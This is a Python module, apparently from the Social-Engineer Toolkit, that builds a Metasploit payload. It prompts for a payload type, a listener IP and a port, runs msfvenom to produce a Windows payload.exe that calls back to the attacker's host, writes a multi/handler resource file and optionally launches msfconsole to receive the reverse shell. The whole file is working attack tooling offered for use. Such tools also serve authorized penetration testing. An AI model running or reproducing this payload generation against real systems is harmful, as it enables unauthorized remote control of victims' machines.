import subprocess
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *
definepath = os.getcwd()
sys.path.append(definepath)
meta_path = meta_path()
def payload_generate(payload, lhost, port):
    subprocess.Popen(meta_path + "msfvenom -p %s LHOST=%s LPORT=%s --format=exe > %s/payload.exe" %
                     (payload, lhost, port, userconfigpath), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
    filewrite = open(userconfigpath + "meta_config", "w")
    filewrite.write(
        "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload, lhost, port))
    filewrite.close()
    print_status(
        "Payload has been exported to the default SET directory located under: " + userconfigpath + "payload.exe")
show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
payload = (raw_input(setprompt(["4"], "")))
if payload == "":
    payload = "2"
payload = ms_payload(payload)
lhost = raw_input(
    setprompt(["4"], "IP address for the payload listener (LHOST)"))
port = raw_input(setprompt(["4"], "Enter the PORT for the reverse listener"))
print_status("Generating the payload.. please be patient.")
payload_generate(payload, lhost, port)
if check_options("INFECTION_MEDIA=") != "ON":
    payload_query = raw_input(setprompt(
        ["4"], "Do you want to start the payload and listener now? (yes/no)"))
    if payload_query.lower() == "y" or payload_query.lower() == "yes":
        print_status(
            "Launching msfconsole, this could take a few to load. Be patient...")
        subprocess.Popen(meta_path + "msfconsole -r " +
                         userconfigpath + "meta_config", shell=True).wait()